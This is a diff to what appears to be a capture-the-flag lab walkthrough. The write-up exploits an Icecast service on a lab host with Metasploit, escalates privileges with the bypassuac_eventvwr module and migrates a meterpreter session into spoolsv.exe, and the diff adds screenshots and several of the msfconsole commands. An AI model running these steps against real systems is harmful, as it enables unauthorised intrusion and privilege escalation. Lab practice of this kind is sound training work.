@@ -13,6 +13,8 @@ nmap -sC -sV -Pn -vv 10.48.129.48
 nmap -sS <IP>
 ```
 
+![enum result](../NPT/Assets/169.png)
+
 On port 3389 we found a vulnerable thing
 
 In CVE details we found vulnerability ICE-cast
@@ -33,7 +35,13 @@ msfconsole
 ```
 
 ```
-exploit/windows/http/icecast_header
+search icecast
+```
+
+![enum result](../NPT/Assets/170.png)
+
+```
+use 0
 ```
 
 ```
@@ -63,6 +71,8 @@ We saw icecast2.exe was running in dark pc
 sysinfo
 ```
 
+![enum result](../NPT/Assets/167.png)
+
 This gets us system information
 
 ```
@@ -76,6 +86,8 @@ For this we will be using this exploit
 exploit/windows/local/bypassuac_eventvwr
 
 Now we will go a step back by Ctrl + Z
+
+Press y to run it in background so we can use this meterpreter exploit session to later use it
 `
 ```
 use exploit/windows/local/bypassuac_eventvwr
@@ -84,14 +96,26 @@ use exploit/windows/local/bypassuac_eventvwr
 Now we gotta view sessions number so type session for it
 
 ```
+sessions -l
+```
+
+![enum result](../NPT/Assets/166.png)
+
+```
 set Session 1
 ```
 
 Now change LHOST to tun0 IP
 
 ```
+set LHOST <tun0 IP>
+```
+
+```
 exploit
 ```
+
+![enum result](../NPT/Assets/168.png)
 
 To verify our new privileges type
 
@@ -107,11 +131,15 @@ Now we will look for a process with NT\ Authority and can help us
 
 So, for this we will use spoolsv.exe
 
+![enum result](../NPT/Assets/171.png)
+
 Now to migrate to that use
 
 ```
 migrate -N spoolsv.exe
 ```
+
+![enum result](../NPT/Assets/172.png)
 
 Now check for user
 
